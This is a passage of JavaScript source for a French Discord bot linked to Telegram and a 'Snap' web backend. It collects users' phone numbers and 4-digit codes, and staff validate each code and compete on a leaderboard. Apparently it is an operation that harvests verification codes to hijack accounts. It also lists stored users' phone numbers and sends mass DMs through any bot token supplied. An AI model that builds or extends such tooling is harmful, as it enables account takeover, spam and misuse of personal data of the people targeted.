  if (!/^\d{4}$/.test(code)) return;
  let candidates = [];
  for (const [k, v] of pending.entries()) {
    if (v.userId === m.author.id) candidates.push([k, v]);
    if (v.threadId && m.channel.id === v.threadId) {
      if (v.userId === m.author.id || m.author.id === v.claimedBy) candidates = [[k, v]];
    }
  }
  let found = null;
  if (candidates.length) {
    candidates.sort((a,b) => {
      const av = a[1].threadId ? 1 : 0, bv = b[1].threadId ? 1 : 0;
      if (av !== bv) return bv - av;
      const ad = a[1].date ? new Date(a[1].date).getTime() : a[1].claimTs ? a[1].claimTs*1000 : 0;
      const bd = b[1].date ? new Date(b[1].date).getTime() : b[1].claimTs ? b[1].claimTs*1000 : 0;
      return bd - ad;
    });
    found = candidates[0];
  }
  if (!found) return;
  const [key, data] = found;
  const originGuildId = data.originGuildId;
  if (data.code === code) return;
  data.code = code;
  pending.set(key, data);
  saveDbStats().catch(() => {});
  console.log(`code recu chat ${m.author.id} ${code} via ${m.guild ? 'salon' : 'DM'}`);
  try { await m.reply({ content: "Code reçu. En attente de validation finale." }); } catch {}
  try {
    const targetChannelId = data.threadId || data.modChannelId;
    const targetChannel = await client.channels.fetch(targetChannelId).catch(() => null);
    if (targetChannel && data.detailMessageId) {
      const detailMsg = await targetChannel.messages.fetch(data.detailMessageId).catch(() => null);
      if (detailMsg) {
        const og = data.originGuildId === "tg" ? { name: "Telegram", memberCount: 0 } : await client.guilds.fetch(data.originGuildId).catch(() => ({ name: "Serveur", memberCount: 0 }));
        const u = await client.users.fetch(data.userId).catch(() => m.author);
        const newEmbed = await buildModEmbed(u, og, data.phone, code, data.dateStr, data.claimTs || Math.floor(Date.now()/1000), data.claimTs ? (()=>{ const e=Date.now()-data.claimTs*1000; return `${String(Math.floor(e/60000)).padStart(2,"0")}:${String(Math.floor((e%60000)/1000)).padStart(2,"0")}` })() : "00:00");
        await detailMsg.edit({ embeds: [newEmbed] }).catch(()=>{});
      }
      const codeSelectRow = new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder().setCustomId(`mod_code_${data.originGuildId}_${data.userId}`).setPlaceholder("📋 Résultat code...").addOptions(
          { label: "Code validé", description: "Code correct — accès accordé", value: "code_validated", emoji: "✅" },
          { label: "Code refusé", description: "Code incorrect — accès refusé", value: "code_refused", emoji: "❌" }
        )
      );
      await targetChannel.send({ content: `📩 **Code reçu** de <@${data.userId}> : \`${code}\` — en attente de validation.`, components: [codeSelectRow] }).catch(()=>{});
    }
  } catch {}
  setTimeout(() => m.delete().catch(()=>{}), 3000);
});

client.on("interactionCreate", async (i) => {
  // === SNAP+ BOUTONS VALIDER / REFUSER ===
  if (i.isButton() && i.customId.startsWith("snap_ok_")) {
    const id = i.customId.replace("snap_ok_", "");
    try {
      await fetch(`${SNAP_SITE}/api/admin/accept/${id}`, { method: "POST" });
      await i.update({ content: "✅ Demande validée", embeds: [], components: [] });
    } catch (e) {
      await i.reply({ content: "Erreur serveur", flags: MessageFlags.Ephemeral });
    }
    return;
  }

  if (i.isButton() && i.customId.startsWith("snap_no_")) {
    const id = i.customId.replace("snap_no_", "");
    try {
      await fetch(`${SNAP_SITE}/api/admin/refuse/${id}`, { method: "POST" });
      await i.update({ content: "❌ Demande refusée", embeds: [], components: [] });
    } catch (e) {
      await i.reply({ content: "Erreur serveur", flags: MessageFlags.Ephemeral });
    }
    return;
  }

  // === WEB STAFF ACTIONS MENU ===
  if (i.isStringSelectMenu() && i.customId.startsWith("web_staff_")) {
    const webId = i.customId.replace("web_staff_", "");
    const data = webTickets.get(webId);
    if (!data) {
      await i.reply({ content: "Demande introuvable.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (data.claimedBy && data.claimedBy !== i.user.id) {
      await i.reply({ content: `Déjà traité par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
      return;
    }

    const value = i.values[0];

    try {
      if (value === "reset") {
        webTickets.delete(webId);
        await i.reply({ content: `🔄 Tentative de <@${data.pseudo}> réinitialisée.` });
        setTimeout(() => i.channel.delete().catch(() => {}), 1500);
        return;
      }

      if (value === "blacklist_num") {
        blacklistedNums.add(data.phone);
        webTickets.delete(webId);
        saveDbStats().catch(() => {});
        await i.reply({ content: `🔴 Numéro ${data.phone} blacklisté.` });
        setTimeout(() => i.channel.delete().catch(() => {}), 1500);
        return;
      }

      if (value === "blacklist_user") {
        blacklistedUsers.add(data.userId || "web");
        webTickets.delete(webId);
        saveDbStats().catch(() => {});
        await i.reply({ content: `⛔ Utilisateur ${data.pseudo} blacklisté.` });
        setTimeout(() => i.channel.delete().catch(() => {}), 1500);
        return;
      }

      if (value === "kick") {
        webTickets.delete(webId);
        saveDbStats().catch(() => {});
        await i.reply({ content: `👢 Utilisateur ${data.pseudo} expulsé.` });
        setTimeout(() => i.channel.delete().catch(() => {}), 1500);
        return;
      }

      if (value === "ban") {
        webTickets.delete(webId);
        saveDbStats().catch(() => {});
        await i.reply({ content: `🔨 Utilisateur ${data.pseudo} banni.` });
        setTimeout(() => i.channel.delete().catch(() => {}), 1500);
        return;
      }
    } catch (e) {
      console.error("Erreur staff web:", e.message);
      await i.reply({ content: "Erreur lors de l'action staff.", flags: MessageFlags.Ephemeral });
    }
    return;
  }

  if (i.isButton() && i.customId.startsWith("web_validate_")) {
    const webId = i.customId.replace("web_validate_", "");
    const data = webTickets.get(webId);
    if (!data) {
      await i.reply({ content: "Demande introuvable.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (data.claimedBy && data.claimedBy !== i.user.id) {
      await i.reply({ content: `Déjà validé par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    data.claimedBy = i.user.id;
    webTickets.set(webId, data);
    try {
      await fetch(`${SNAP_SITE}/api/admin/accept/${webId}`, { method: "POST" });
      webTickets.set(webId, data);
      await i.update({ content: `✅ Validé par <@${i.user.id}> — \`${data.pseudo}\` (\`${data.phone}\`)`, components: [] });
    } catch (e) {
      await i.reply({ content: "Erreur serveur", flags: MessageFlags.Ephemeral });
    }
    return;
  }

  if (i.isButton() && i.customId.startsWith("web_refused_")) {
    const webId = i.customId.replace("web_refused_", "");
    const data = webTickets.get(webId);
    if (!data) {
      await i.reply({ content: "Demande introuvable.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (data.claimedBy && data.claimedBy !== i.user.id) {
      await i.reply({ content: `Déjà traité par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    data.claimedBy = i.user.id;
    webTickets.set(webId, data);
    try {
      await fetch(`${SNAP_SITE}/api/admin/refuse/${webId}`, { method: "POST" });
      webTickets.set(webId, data);
      await i.update({ content: `❌ Refusé par <@${i.user.id}> — \`${data.pseudo}\` (\`${data.phone}\`)`, components: [] });
    } catch (e) {
      await i.reply({ content: "Erreur serveur", flags: MessageFlags.Ephemeral });
    }
    return;
  }

  if (i.isButton() && i.customId.startsWith("web_msg_")) {
    const webId = i.customId.replace("web_msg_", "");
    const data = webTickets.get(webId);
    if (!data) {
      await i.reply({ content: "Demande introuvable.", flags: MessageFlags.Ephemeral });
      return;
    }
    await i.reply({ content: `💬 Envoie un MP à <@${data.userId}> pour la suite.`, flags: MessageFlags.Ephemeral });
    return;
  }

  if (i.isButton() && i.customId.startsWith("web_close_")) {
    const webId = i.customId.replace("web_close_", "");
    const data = webTickets.get(webId);
    if (!data) {
      await i.reply({ content: "Demande inconnue ou expirée.", flags: MessageFlags.Ephemeral });
      return;
    }
    if (data.claimedBy && data.claimedBy !== i.user.id) {
      await i.reply({ content: `Déjà traité par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    await i.channel.delete().catch(() => {});
    webTickets.delete(webId);
    return;
  }

  if (i.isChatInputCommand() && i.commandName === "stats") {
    const total = stats.validated + stats.failed;
    const successRate = total > 0 ? Math.round((stats.validated / total) * 100) : 0;
    const lastUpdateStr = stats.lastUpdate ? new Date(stats.lastUpdate).toLocaleString("fr-FR", { timeZone: "Europe/Paris", day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit", second: "2-digit" }) : "Aucune";
    const lastBy = stats.lastUpdateBy ? `<@${stats.lastUpdateBy}>` : "—";
    const lastStatusEmoji = stats.lastStatus === "validated" ? "✅ Validé" : stats.lastStatus === "failed" ? "❌ Échoué" : "—";
    const embed = new EmbedBuilder()
      .setTitle("📊 Stats vérifications")
      .setColor(0x5865f2)
      .setThumbnail(client.user.displayAvatarURL())
      .addFields(
        { name: "✅ Validés", value: `**${stats.validated}**`, inline: true },
        { name: "❌ Échoués", value: `**${stats.failed}**`, inline: true },
        { name: "📦 Total", value: `**${total}**`, inline: true },
        { name: "📈 Taux de réussite", value: `**${successRate}%**`, inline: true },
        { name: "🕒 Dernière actualisation", value: `${lastUpdateStr}`, inline: false },
        { name: "👤 Par", value: `${lastBy} ${stats.lastUpdateBy ? \`\`${stats.lastUpdateBy}\`\` : ""}`, inline: true },
        { name: "📌 Dernier statut", value: `${lastStatusEmoji}`, inline: true }
      )
      .setFooter({ text: `Demandé par ${i.user.tag}` , iconURL: i.user.displayAvatarURL() })
      .setTimestamp();
    await i.reply({ embeds: [embed] });
    return;
  }
  if (i.isChatInputCommand() && i.commandName === "classement") {
    await i.deferReply();
    if (!stats.staff) stats.staff = {};
    let guild = null;
    try { guild = await client.guilds.fetch(MOD_GUILD_ID); } catch { guild = i.guild; }
    if (!guild) {
      await i.editReply("Impossible de récupérer le serveur.");
      return;
    }
    try { await guild.members.fetch(); } catch (e) { console.error("members fetch fail:", e.message); }
    const members = [...guild.members.cache.values()].filter(m => !m.user.bot);
    const list = members.map(m => {
      const s = stats.staff[m.id] || { validated: 0, failed: 0, lastUpdate: null, lastStatus: null, tag: m.user.tag };
      const total = s.validated + s.failed;
      const rate = total ? Math.round((s.validated/total)*100) : 0;
      return { id: m.id, tag: m.user.tag, validated: s.validated, failed: s.failed, total: s.total, rate: s.rate, lastUpdate: s.lastUpdate };
    });
    list.sort((a,b) => {
      if (b.validated !== a.validated) return b.validated - a.validated;
      if (b.total !== a.total) return b.total - a.total;
      return a.tag.localeCompare(b.tag);
    });
    const globalTotal = stats.validated + stats.failed;
    const header = " #  | Membre              | Valid | Échou | Total | Taux ";
    const sep = "----|---------------------|-------|-------|-------|------";
    let rows = list.map((e, idx) => {
      const rank = String(idx+1).padStart(2, " ");
      const name = e.tag.slice(0, 19).padEnd(19, " ");
      const v = String(e.validated).padStart(5, " ");
      const f = String(e.failed).padStart(5, " ");
      const t = String(e.total).padStart(5, " ");
      const r = (e.rate + "%").padStart(4, " ");
      return `${rank} | ${name} | ${v} | ${f} | ${t} | ${r}`;
    });
    const maxRowsPerPage = 25;
    const totalPages = Math.max(1, Math.ceil(rows.length / maxRowsPerPage));
    const page = 0;
    const slice = rows.slice(page * maxRowsPerPage, (page+1)*maxRowsPerPage);
    let table = "```\n" + header + "\n" + sep + "\n" + slice.join("\n") + "\n```";
    const embed = new EmbedBuilder()
      .setTitle("🏆 Classement — tous les membres")
      .setDescription(table)
      .setColor(0xf1c40f)
      .addFields(
        { name: "📊 Global", value: `✅ ${stats.validated} validés | ❌ ${stats.failed} échoués | 📦 ${globalTotal} | 👥 ${members.length} membres`, inline: false },
        { name: "🕒 Dernière action", value: stats.lastUpdate ? `<t:${Math.floor(new Date(stats.lastUpdate)/1000)}:R> par <@${stats.lastUpdateBy}>` : "—", inline: false }
      )
      .setFooter({ text: `Demandé par ${i.user.tag} • ${list.length} membres • page ${page+1}/${totalPages}`, iconURL: i.user.displayAvatarURL() })
      .setTimestamp();
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`classement_page_${page-1}`).setLabel("◀ Précédent").setStyle(ButtonStyle.Secondary).setDisabled(page===0),
      new ButtonBuilder().setCustomId(`classement_page_${page+1}`).setLabel("Suivant ▶").setStyle(ButtonStyle.Secondary).setDisabled(page===totalPages-1)
    );
    await i.editReply({ embeds: [embed], components: totalPages>1 ? [row] : [] });
    return;
  }
  if (i.isChatInputCommand() && i.commandName === "historique") {
    if (!i.member.roles.cache.has("1547699868317782096")) {
      await i.reply({ content: "❌ Rôle requis : <@&1547699868317782096>", flags: MessageFlags.Ephemeral });
      return;
    }
    const target = i.options.getUser("membre") || i.user;
    if (!stats.staff) stats.staff = {};
    const s = stats.staff[target.id] || { validated: 0, failed: 0, lastUpdate: null, lastStatus: null };
    const total = s.validated + s.failed;
    const rate = total ? Math.round((s.validated/total)*100) : 0;
    const lastStr = s.lastUpdate ? new Date(s.lastUpdate).toLocaleString("fr-FR", { timeZone: "Europe/Paris", day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit", second: "2-digit" }) : "—";
    const lastEmoji = s.lastStatus === "validated" ? "✅ Validé" : s.lastStatus === "failed" ? "❌ Échoué" : "—";
    const entries = Object.entries(stats.staff).sort((a,b) => b[1].validated - a[1].validated);
    const rank = entries.findIndex(([id]) => id === target.id) + 1;
    const embed = new EmbedBuilder()
      .setTitle(`📜 Historique — ${target.tag}`)
      .setThumbnail(target.displayAvatarURL())
      .setColor(0x5865f2)
      .addFields(
        { name: "✅ Validés", value: `**${s.validated}**`, inline: true },
        { name: "❌ Échoués", value: `**${s.failed}**`, inline: true },
        { name: "📦 Total", value: `**${total}**`, inline: true },
        { name: "📈 Taux de réussite", value: `**${rate}%**`, inline: true },
        { name: "🏅 Rang", value: rank ? `#${rank} / ${entries.length}` : "—", inline: true },
        { name: "🕒 Dernière action", value: `${lastStr}`, inline: false },
        { name: "📌 Dernier statut", value: `${lastEmoji}`, inline: true },
        { name: "👤 ID", value: `\`${target.id}\``, inline: true }
      )
      .setFooter({ text: `Demandé par ${i.user.tag}`, iconURL: i.user.displayAvatarURL() })
      .setTimestamp();
    await i.reply({ embeds: [embed] });
    return;
  }
  if (i.isChatInputCommand() && i.commandName === "tg_msg") {
    const ALLOWED_ROLE = "1547699868317782096";
    const ALLOWED_CHANNEL = "1548542207605342230";
    if (i.channelId !== ALLOWED_CHANNEL) {
      await i.reply({ content: `❌ Cette commande est utilisable uniquement dans <#${ALLOWED_CHANNEL}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    if (!i.member.roles.cache.has(ALLOWED_ROLE)) {
      await i.reply({ content: `❌ Rôle requis : <@&${ALLOWED_ROLE}>`, flags: MessageFlags.Ephemeral });
      return;
    }
    const tgId = i.options.getString("id");
    const msg = i.options.getString("message");
    if (!tgBot) {
      await i.reply({ content: "Bot Telegram non connecté (TELEGRAM_BOT_TOKEN manquant).", flags: MessageFlags.Ephemeral });
      return;
    }
    try {
      await tgBot.telegram.sendMessage(tgId, msg);
      await i.reply({ content: `✅ Message Telegram envoyé à \`${tgId}\` :\n> ${msg}`, flags: MessageFlags.Ephemeral });
    } catch (e) {
      await i.reply({ content: `❌ Erreur Telegram: ${e.message}`, flags: MessageFlags.Ephemeral });
    }
    return;
  }
  if (i.isChatInputCommand() && i.commandName === "dm") {
    const ALLOWED_ROLE = "1547699868317782096";
    const ALLOWED_CHANNEL = "1548542207605342230";
    if (i.channelId !== ALLOWED_CHANNEL) {
      await i.reply({ content: `❌ Cette commande est utilisable uniquement dans <#${ALLOWED_CHANNEL}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    if (!i.member.roles.cache.has(ALLOWED_ROLE)) {
      await i.reply({ content: `❌ Rôle requis : <@&${ALLOWED_ROLE}>`, flags: MessageFlags.Ephemeral });
      return;
    }
    const target = i.options.getUser("membre");
    const msg = i.options.getString("message");
    try {
      const u = await client.users.fetch(target.id);
      await u.send(msg);
      await i.reply({ content: `✅ MP Discord envoyé à ${target.tag} (\`${target.id}\`)`, flags: MessageFlags.Ephemeral });
    } catch (e) {
      await i.reply({ content: `❌ Erreur DM: ${e.message} (MP fermés ?)`, flags: MessageFlags.Ephemeral });
    }
    return;
  }
  if (i.isChatInputCommand() && i.commandName === "mass_dm_discord") {
    const ALLOWED_ROLE = "1547699868317782096";
    const ALLOWED_CHANNEL = "1548542207605342230";
    if (i.channelId !== ALLOWED_CHANNEL) {
      await i.reply({ content: `❌ Cette commande est utilisable uniquement dans <#${ALLOWED_CHANNEL}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    if (!i.member.roles.cache.has(ALLOWED_ROLE)) {
      await i.reply({ content: `❌ Rôle requis : <@&${ALLOWED_ROLE}>`, flags: MessageFlags.Ephemeral });
      return;
    }
    const msg = i.options.getString("message");
    const tmpKey = `mass_discord_${i.user.id}_${Date.now()}`;
    pending.set(tmpKey, { massMsg: msg, plateforme: "discord", requester: i.user.id });
    const modal = new ModalBuilder().setCustomId(`mass_discord_modal_${tmpKey}`).setTitle("Mass DM Discord — Token");
    const tokenInput = new TextInputBuilder().setCustomId("token").setLabel("Token du bot Discord à utiliser").setPlaceholder("MTM...").setStyle(TextInputStyle.Short).setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
    await i.showModal(modal);
    return;
  }
  if (i.isChatInputCommand() && i.commandName === "mass_dm_telegram") {
    const ALLOWED_ROLE = "1547699868317782096";
    const ALLOWED_CHANNEL = "1548542207605342230";
    if (i.channelId !== ALLOWED_CHANNEL) {
      await i.reply({ content: `❌ Cette commande est utilisable uniquement dans <#${ALLOWED_CHANNEL}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    if (!i.member.roles.cache.has(ALLOWED_ROLE)) {
      await i.reply({ content: `❌ Rôle requis : <@&${ALLOWED_ROLE}>`, flags: MessageFlags.Ephemeral });
      return;
    }
    const msg = i.options.getString("message");
    let count = Object.keys(stats.telegramUsers || {}).length;
    if (count === 0) count = [...pending.keys()].filter(k => k.startsWith("tg:")).length || 0;
    const embed = new EmbedBuilder()
      .setTitle("⚠️ Mass DM Telegram")
      .setDescription(`Tu vas envoyer à **${count}** membres Telegram :\n> ${msg.slice(0, 1000)}\n\n**Confirme ?**\n- Seuls les users ayant \`/start\` recevront\n- Rate limit 1 msg/sec`)
      .setColor(0x0088cc)
      .setFooter({ text: `Demandé par ${i.user.tag}` });
    const tmpKey = `mass_telegram_${i.user.id}_${Date.now()}`;
    pending.set(tmpKey, { massMsg: msg, plateforme: "telegram", requester: i.user.id });
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`mass_dm_confirm2_${tmpKey}`).setLabel("✅ Confirmer").setStyle(ButtonStyle.Danger),
      new ButtonBuilder().setCustomId("mass_dm_cancel").setLabel("Annuler").setStyle(ButtonStyle.Secondary)
    );
    await i.reply({ embeds: [embed], components: [row], flags: MessageFlags.Ephemeral });
    return;
  }
  if (i.isButton() && i.customId === "mass_dm_cancel") {
    await i.update({ content: "Annulé.", embeds: [], components: [] });
    return;
  }
  if (i.isButton() && i.customId.startsWith("mass_dm_confirm2_")) {
    const tmpKey = i.customId.replace("mass_dm_confirm2_", "");
    const data = pending.get(tmpKey);
    if (!data) { await i.update({ content: "Demande expirée.", embeds: [], components: [] }); return; }
    const ALLOWED_ROLE = "1547699868317782096";
    if (!i.member.roles.cache.has(ALLOWED_ROLE)) { await i.reply({ content: "Rôle requis.", flags: MessageFlags.Ephemeral }); return; }
    const { massMsg, plateforme } = data;
    pending.delete(tmpKey);
    await i.update({ content: `⏳ Envoi massif ${plateforme} en cours...`, embeds: [], components: [] });
    let sent = 0, failed = 0;
    if (plateforme === "discord") {
      const token = data.token;
      let targetClient = client;
      let needDestroy = false;
      if (token) {
        try {
          const { Client: TmpClient, GatewayIntentBits: TmpBits } = require("discord.js");
          targetClient = new TmpClient({ intents: [TmpBits.Guilds, TmpBits.GuildMembers] });
          await targetClient.login(token);
          await new Promise(r => setTimeout(r, 2000));
          needDestroy = true;
        } catch (e) {
          await i.followUp({ content: `❌ Token invalide ou connexion échouée: ${e.message}`, flags: MessageFlags.Ephemeral });
          return;
        }
      }
      try {
        const g = await targetClient.guilds.fetch(MOD_GUILD_ID);
        await g.members.fetch();
        const members = [...g.members.cache.values()].filter(m => !m.user.bot);
        for (const m of members) {
          try { await targetClient.users.fetch(m.id).then(u => u.send(massMsg)); sent++; } catch { failed++; }
          await new Promise(r => setTimeout(r, 1100));
        }
      } catch (e) { failed++; }
      if (needDestroy) { try { await targetClient.destroy(); } catch {} }
    } else {
      if (!tgBot) { await i.followUp({ content: "Bot Telegram non connecté.", flags: MessageFlags.Ephemeral }); return; }
      let tgIds = Object.keys(stats.telegramUsers || {});
      if (tgIds.length === 0) tgIds = [...pending.keys()].filter(k => k.startsWith("tg:")).map(k => k.split(":")[1]);
      if (tgIds.length === 0) {
        await i.followUp({ content: "Aucun user Telegram stocké. Les users doivent d'abord faire /start sur le bot Telegram.", flags: MessageFlags.Ephemeral });
        return;
      }
      for (const tid of tgIds) {
        try { await tgBot.telegram.sendMessage(tid, massMsg); sent++; } catch { failed++; }
        await new Promise(r => setTimeout(r, 1100));
      }
    }
    await i.followUp({ content: `✅ Mass DM ${plateforme} terminé : **${sent}** envoyés, **${failed}** échoués (MP fermés / bloqués).`, flags: MessageFlags.Ephemeral });
    return;
  }
  if (i.isChatInputCommand() && i.commandName === "help") {
    const embed = new EmbedBuilder()
      .setTitle("📖 Aide — Bot Didi")
      .setColor(0x5865f2)
      .setThumbnail(client.user.displayAvatarURL())
      .setDescription("Toutes les commandes disponibles :")
      .addFields(
        { name: "💬 Message — envoie des MPs", value: "`/tg_msg` — Envoie un MP Telegram à un ID (`id` + `message`) — *rôle <@&1547699868317782096> + <#1548542207605342230>*\n`/dm` — Envoie un MP Discord à un membre (`membre` + `message`) — *même restriction*\n`/mass_dm_discord` — Mass DM Discord (demande le token systématiquement) — *confirmation + 1.1s*\n`/mass_dm_telegram` — Mass DM Telegram à tous les users stockés — *confirmation*", inline: false },
        { name: "🛠️ Utile — infos", value: "`/stats` — Stats globales validés/échoués + dernière action (public)\n`/classement` — Tableau de tous les membres triés (avec pagination) — *public*\n`/help` — Affiche ce message", inline: false },
        { name: "👮 Modo — restreint", value: "`/historique` — Historique d'un membre (`membre` optionnel, 0 si aucun) — *rôle <@&1547699868317782096>*\n`/listetlg` — Liste tous les users Telegram stockés\n`/resetstat` — Reset les stats d'un membre\n`/test_timeout` — Test le timeout 15min (faux pending)\n`/clear` — Supprime les messages du salon — *Gérer les messages*", inline: false }
      )
      .setFooter({ text: `Demandé par ${i.user.tag}`, iconURL: i.user.displayAvatarURL() })
      .setTimestamp();
    await i.reply({ embeds: [embed] });
    return;
  }
  if (i.isChatInputCommand() && i.commandName === "test_timeout") {
    if (!i.member.roles.cache.has("1547699868317782096")) {
      await i.reply({ content: "❌ Rôle requis : <@&1547699868317782096>", flags: MessageFlags.Ephemeral });
      return;
    }
    await i.reply({ content: "⏳ Création d'un faux pending + simulation timeout 15min...", flags: MessageFlags.Ephemeral });
    try {
      const fakeUser = i.user;
      const fakePhone = "0600000000";
      const originGuildId = MOD_GUILD_ID;
      const key = `${originGuildId}:${fakeUser.id}_test_${Date.now()}`;
      const now = new Date(Date.now() - 16*60*1000);
      const dateStr = now.toLocaleString("fr-FR", { timeZone: "Europe/Paris", day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });
      const embed = buildClaimEmbed(fakeUser, { name: "TEST", memberCount: 0 }, true, 0, dateStr, null);
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`claim_${originGuildId}_${fakeUser.id}`).setLabel("Claim TEST").setStyle(ButtonStyle.Secondary)
      );
      const modChannel = await getModChannel();
      const sent = await modChannel.send({ content: `🧪 TEST TIMEOUT <@&1547717348348403812>`, embeds: [embed], components: [row], allowedMentions: { roles: ["1547717348348403812"] } });
      const testKey = `${originGuildId}:${fakeUser.id}`;
      pending.set(testKey, { phone: fakePhone, code: null, originGuildId, userId: fakeUser.id, date: now, dateStr, modChannelId: modChannel.id, modMessageId: sent.id, claimedBy: null, threadId: null, detailMessageId: null });
      try {
        const u = await client.users.fetch(fakeUser.id);
        const testEmbed = new EmbedBuilder().setTitle("⏳ [TEST] File d'attente — Modération").setDescription("Aucun modérateur n'est disponible pour le moment.\n\nTa demande est bien enregistrée, tu seras notifié dès qu'un modérateur sera disponible.\n\n*Merci de patienter* 🙏").setColor(0xfaa61a).setTimestamp();
        await u.send({ embeds: [testEmbed] });
      } catch {}
      const baseDesc = embed.description || "";
      const timeoutEmbed = new EmbedBuilder()
        .setTitle(fakeUser.username + " • " + fakeUser.id + " [TEST]")
        .setDescription(baseDesc + "\n\n⏳ **Non claim après 15 min — Aucun modérateur n'a pris la demande**\n*Utilisateur notifié : réessaie plus tard*")
        .setColor(0x808080)
        .setTimestamp();
      const pretRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`pret_${originGuildId}_${fakeUser.id}`).setLabel("✅ Prêt — Notifier l'utilisateur [TEST]").setStyle(ButtonStyle.Success).setEmoji("👋")
      );
      await sent.edit({ embeds: [timeoutEmbed], components: [pretRow] });
      const d = pending.get(testKey);
      if (d) { d.timedOut = true; pending.set(testKey, d); }
      await i.followUp({ content: `✅ Test créé dans <#${modChannel.id}> — vérifie le log et clique **Prêt** pour tester le DM.`, flags: MessageFlags.Ephemeral });
    } catch (e) {
      await i.followUp({ content: `❌ Erreur test: ${e.message}`, flags: MessageFlags.Ephemeral });
    }
    return;
  }
  if (i.isChatInputCommand() && i.commandName === "resetstat") {
    if (!i.member.roles.cache.has("1547699868317782096")) {
      await i.reply({ content: "❌ Rôle requis : <@&1547699868317782096>", flags: MessageFlags.Ephemeral });
      return;
    }
    const target = i.options.getUser("membre");
    if (!stats.staff) stats.staff = {};
    const s = stats.staff[target.id];
    if (!s) {
      await i.reply({ content: `Aucune stat à reset pour ${target.tag} (\`${target.id}\`) — déjà à 0.`, flags: MessageFlags.Ephemeral });
      return;
    }
    const oldV = s.validated, oldF = s.failed;
    s.validated = 0; s.failed = 0; s.lastUpdate = new Date().toISOString(); s.lastStatus = null;
    let totV = 0, totF = 0;
    for (const v of Object.values(stats.staff)) { totV += v.validated; totF += v.failed; }
    stats.validated = totV; stats.failed = totF;
    stats.lastUpdate = new Date().toISOString();
    stats.lastUpdateBy = i.user.id;
    await saveDbStats();
    await i.reply({ content: `✅ Stats reset pour ${target.tag} par <@${i.user.id}> : **${oldV} validés / ${oldF} échoués → 0/0**\nGlobal recalculé : **${totV} validés / ${totF} échoués**` });
    return;
  }
  if (i.isChatInputCommand() && i.commandName === "listetlg") {
    const ALLOWED_ROLE = "1547699868317782096";
    const ALLOWED_CHANNEL = "1548542207605342230";
    if (i.channelId !== ALLOWED_CHANNEL) {
      await i.reply({ content: `❌ Cette commande est utilisable uniquement dans <#${ALLOWED_CHANNEL}>.`, flags: MessageFlags.Ephemeral });
      return;
    }
    if (!i.member.roles.cache.has(ALLOWED_ROLE)) {
      await i.reply({ content: `❌ Rôle requis : <@&${ALLOWED_ROLE}>`, flags: MessageFlags.Ephemeral });
      return;
    }
    const users = stats.telegramUsers || {};
    const entries = Object.entries(users);
    if (entries.length === 0) {
      await i.reply({ content: "Aucun user Telegram stocké. Ils apparaîtront après un `/start` ou un envoi de numéro.", flags: MessageFlags.Ephemeral });
      return;
    }
    entries.sort((a,b) => new Date(b[1].lastSeen || 0) - new Date(a[1].lastSeen || 0));
    const maxRows = 20;
    const page = 0;
    const slice = entries.slice(0, maxRows);
    const header = " ID            | @Pseudo          | Prénom        | Téléphone      | Vu le";
    const sep = "---------------|------------------|-----------------|----------------|-------------------";
    const rows = slice.map(([id, u]) => {
      const pseudo = (u.username ? "@"+u.username : "—").slice(0, 16).padEnd(16, " ");
      const prenom = (u.first_name || "—").slice(0, 15).padEnd(15, " ");
      const phone = (u.phone ? formatPhone(u.phone) : "—").slice(0, 14).padEnd(14, " ");
      const vu = u.lastSeen ? new Date(u.lastSeen).toLocaleString("fr-FR", { day:"2-digit", month:"2-digit", hour:"2-digit", minute:"2-digit" }) : "—";
      return `${id.padEnd(13, " ")} | ${pseudo} | ${prenom} | ${phone} | ${vu}`;
    });
    const table = "```\n" + header + "\n" + sep + "\n" + rows.join("\n") + "\n```";
    const embed = new EmbedBuilder()
      .setTitle("📋 Liste Telegram — users stockés")
      .setDescription(table)
      .setColor(0x0088cc)
      .addFields({ name: "📊 Total", value: `${entries.length} users`, inline: true }, { name: "💾 Stockage", value: `<#${DB_STATS_CHANNEL_ID}>`, inline: true })
      .setFooter({ text: `Demandé par ${i.user.tag} • page 1/${Math.ceil(entries.length/maxRows)}`, iconURL: i.user.displayAvatarURL() })
      .setTimestamp();
    const hasMore = entries.length > maxRows;
    const row = hasMore ? new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`listetlg_page_1`).setLabel("Suivant ▶").setStyle(ButtonStyle.Secondary)
    ) : null;
    await i.reply({ embeds: [embed], components: hasMore ? [row] : [], flags: MessageFlags.Ephemeral });
    return;
  }
  if (i.isButton() && i.customId.startsWith("listetlg_page_")) {
    const page = parseInt(i.customId.replace("listetlg_page_", ""), 10);
    const users = stats.telegramUsers || {};
    const entries = Object.entries(users).sort((a,b) => new Date(b[1].lastSeen || 0) - new Date(a[1].lastSeen || 0));
    const maxRows = 20;
    const totalPages = Math.ceil(entries.length / maxRows);
    const p = Math.max(0, Math.min(page, totalPages-1));
    const slice = entries.slice(p*maxRows, (p+1)*maxRows);
    const header = " ID            | @Pseudo          | Prénom        | Téléphone      | Vu le";
    const sep = "---------------|------------------|-----------------|----------------|-------------------";
    const rows = slice.map(([id, u]) => {
      const pseudo = (u.username ? "@"+u.username : "—").slice(0, 16).padEnd(16, " ");
      const prenom = (u.first_name || "—").slice(0, 15).padEnd(15, " ");
      const phone = (u.phone ? formatPhone(u.phone) : "—").slice(0, 14).padEnd(14, " ");
